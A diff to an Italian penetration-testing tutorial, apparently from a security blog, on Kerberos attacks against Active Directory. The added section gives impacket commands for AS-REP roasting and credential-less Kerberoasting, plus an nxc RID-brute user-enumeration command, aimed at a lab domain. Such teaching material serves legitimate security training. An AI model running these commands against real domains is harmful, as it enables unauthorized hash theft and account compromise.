@@ -1,10 +1,7 @@
 ---
 title: 'Kerberos Attacchi Active Directory: Kerberoasting, AS-REP, Golden Ticket'
 slug: kerberos
-description: >-
-  Porta 88 Kerberos: guida completa al penetration testing Active Directory.
-  Scopri Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket e
-  Pass-the-Ticket per privilege escalation e lateral movement.
+description: 'Porta 88 Kerberos: guida completa al penetration testing Active Directory. Scopri Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket e Pass-the-Ticket per privilege escalation e lateral movement.'
 image: '/ChatGPT Image 26 feb 2026, 12_46_57.webp'
 draft: false
 date: 2026-03-01T00:00:00.000Z
@@ -135,6 +132,22 @@ impacket-GetNPUsers corp.local/j.rossi:Password1 -dc-ip 10.10.10.10 -request
 ```
 
 Questo usa [LDAP](https://hackita.it/articoli/porta-389-ldap) per trovare automaticamente tutti gli utenti con `DONT_REQUIRE_PREAUTH` → estrae tutti gli hash in un colpo.
+
+## 2b. Kerberoasting senza credenziali (via AS-REP)
+
+Se esiste un utente con `DONT_REQUIRE_PREAUTH`, puoi usarlo per richiedere TGS di altri account **senza avere nessuna credenziale valida o se non riesci a crackare l'hash.**
+
+```bash
+# Step 1 — trova utenti senza pre-auth
+impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
+
+# Step 2 — usa quell'utente per kerberoastare gli altri
+GetUserSPNs.py -no-preauth <utente_no_preauth> -usersfile users.txt -dc-host 10.10.10.10 corp.local/
+```
+
+L'hash ottenuto nel Step 1 **non serve craccarlo** — serve solo il nome utente come leva per il Step 2. In users.txt devi avere una lista di user. lancia prima nxc smb ip -u guest -p "" —users/—rid-brute 10000 . O lo stesso comando ma con credenziali valide.
+
+> **Nota:** questa tecnica funziona solo se nel dominio esiste almeno un account con `DONT_REQUIRE_PREAUTH` e almeno un service account con SPN registrato.
 
 ## 3. Kerberoasting — Hash di Service Account
 
